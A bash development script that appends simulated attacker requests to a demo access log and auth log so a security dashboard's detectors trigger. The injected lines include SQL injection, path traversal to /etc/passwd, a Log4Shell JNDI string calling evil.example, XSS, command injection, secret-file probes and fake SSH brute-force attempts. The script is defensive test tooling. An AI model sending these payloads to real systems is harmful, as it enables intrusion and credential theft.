#!/usr/bin/env bash
# Inject simulated scanner/attacker requests into the demo log so you can watch the
# dashboard light up (Sentinel line, feed, bans ledger). Run while dev/demo.sh is up.
#
# Usage:
#   bash dev/attack.sh           # one burst from a few random "attacker" IPs
#   bash dev/attack.sh loop      # keep injecting every ~2s until Ctrl-C
set -euo pipefail
cd "$(dirname "$0")/.."

LOG="dev/run/access.log"
AUTHLOG="dev/run/auth.log"
if [[ ! -f "$LOG" ]]; then
  echo "No $LOG — start the demo first: bash dev/demo.sh" >&2
  exit 1
fi

PATHS=(
  "/wp-login.php" "/phpmyadmin/" "/.env" "/.git/config" "/xmlrpc.php"
  "/adminer.php" "/old/wp-admin/" "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
  "/config.php.bak" "/.aws/credentials"
)
# Public-looking source IPs (NOT in the demo allowlist). Enough distinct IPs that a
# single burst exceeds the per-bucket scan threshold and flips the dashboard to
# "Under scan" (each distinct banned IP = one detection event).
IPS=(
  185.220.101.5 45.13.22.7 92.118.39.10 193.32.162.3 80.94.95.112 141.98.10.61
  103.74.19.88 159.65.220.4 196.251.88.12 23.94.5.140 5.188.206.18 89.248.165.74
  77.90.185.33 209.141.50.9 162.243.131.7
)

inject_one() {
  local ip="${1:-${IPS[$RANDOM % ${#IPS[@]}]}}"
  local p="${PATHS[$RANDOM % ${#PATHS[@]}]}"
  local now; now="$(date '+%d/%b/%Y:%H:%M:%S %z')"
  printf '%s - - [%s] "GET %s HTTP/1.1" 404 0 "-" "curl/8.0"\n' "$ip" "$now" "$p" >> "$LOG"
  echo "injected: $ip  $p"
}

# Also drop one allowlisted + one clean request to show they are ignored.
clean_noise() {
  local now; now="$(date '+%d/%b/%Y:%H:%M:%S %z')"
  printf '10.0.0.5 - - [%s] "GET /wp-login.php HTTP/1.1" 404 0 "-" "-"\n' "$now" >> "$LOG"   # allowlisted → ignored
  printf '203.0.113.20 - - [%s] "GET /api/health HTTP/1.1" 200 0 "-" "-"\n' "$now" >> "$LOG" # clean → ignored
}

# Real exploit probes: SQLi / path-traversal / RCE / Log4Shell payloads in the URI trip
# the exploit detector (a separate signal from the path-based http scanner above).
exploit_probes() {
  local now; now="$(date '+%d/%b/%Y:%H:%M:%S %z')"
  local probes=(
    "/?id=1+UNION+SELECT+username,password+FROM+users"
    "/login?u=admin'+OR+1=1--"
    "/index?file=../../../../etc/passwd"
    "/api?msg=\${jndi:ldap://evil.example/a}"
    "/search?q=<script>alert(1)</script>"
    "/?cmd=;cat+/etc/passwd"
  )
  local ips=(91.92.240.18 194.165.16.74 88.214.25.9 45.95.147.22 171.25.193.20 109.70.100.6)
  local i
  for i in "${!probes[@]}"; do
    printf '%s - - [%s] "GET %s HTTP/1.1" 403 0 "-" "curl/8.0"\n' \
      "${ips[$i]}" "$now" "${probes[$i]}" >> "$LOG"
    echo "exploit probe: ${ips[$i]}  ${probes[$i]}"
  done
}

# Real bad-bot probes: a scanner/pentest-tool User-Agent trips the badbot detector
# (a separate signal from the URI-based http/exploit detectors).
badbot_probes() {
  local now; now="$(date '+%d/%b/%Y:%H:%M:%S %z')"
  local uas=(
    "sqlmap/1.7.2#stable (https://sqlmap.org)"
    "Mozilla/5.0 (Nikto/2.5.0)"
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
    "masscan/1.3"
    "python-requests/2.31.0"
    "WPScan v3.8.22 (https://wpscan.com/)"
  )
  local ips=(176.65.148.10 45.156.128.7 80.66.76.30 193.142.146.21 162.216.150.8 152.32.207.44)
  local i
  for i in "${!uas[@]}"; do
    printf '%s - - [%s] "GET / HTTP/1.1" 200 12 "-" "%s"\n' \
      "${ips[$i]}" "$now" "${uas[$i]}" >> "$LOG"
    echo "bad bot: ${ips[$i]}  ${uas[$i]}"
  done
}

# Real rate-abuse flood: many clean requests from ONE IP trip the ratelimit detector.
# Clean path + browser UA so http/exploit/badbot stay silent — only the rate counts.
rate_flood() {
  local now; now="$(date '+%d/%b/%Y:%H:%M:%S %z')"
  local ip="51.222.84.10"
  local ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
  local i
  for i in $(seq 1 12); do
    printf '%s - - [%s] "GET /products/%d HTTP/1.1" 200 812 "-" "%s"\n' \
      "$ip" "$now" "$i" "$ua" >> "$LOG"
  done
  echo "rate flood: $ip (12 requests in a burst)"
}

# Real SSH brute-force: several failed logins from the same IP trips the sshd detector
# (threshold 3 in the demo). Users from the allowlist (10.x) are ignored.
ssh_bruteforce() {
  [[ -f "$AUTHLOG" ]] || return 0
  local ts; ts="$(date '+%b %e %H:%M:%S')"
  local users=(root admin oracle postgres ubuntu)
  for ip in 218.92.0.51 159.203.88.7 45.135.232.40; do
    for u in "${users[@]}"; do
      printf '%s host sshd[%d]: Failed password for invalid user %s from %s port %d ssh2\n' \
        "$ts" "$RANDOM" "$u" "$ip" "$((RANDOM % 60000 + 1024))" >> "$AUTHLOG"
    done
    echo "ssh brute-force: $ip (5 failed logins)"
  done
}

if [[ "${1:-}" == "loop" ]]; then
  echo "Injecting every ~2s. Ctrl-C to stop."
  while true; do inject_one; sleep 2; done
else
  # A burst of 10 DISTINCT http attackers — guarantees the per-bucket scan threshold
  # is exceeded so the dashboard flips to "Under scan".
  for i in $(seq 0 9); do inject_one "${IPS[$i]}"; done
  exploit_probes
  badbot_probes
  rate_flood
  ssh_bruteforce
  clean_noise
  echo "Done. The dashboard should show http + exploit + badbot + ratelimit + sshd bans and flip to 'Under scan'."
fi
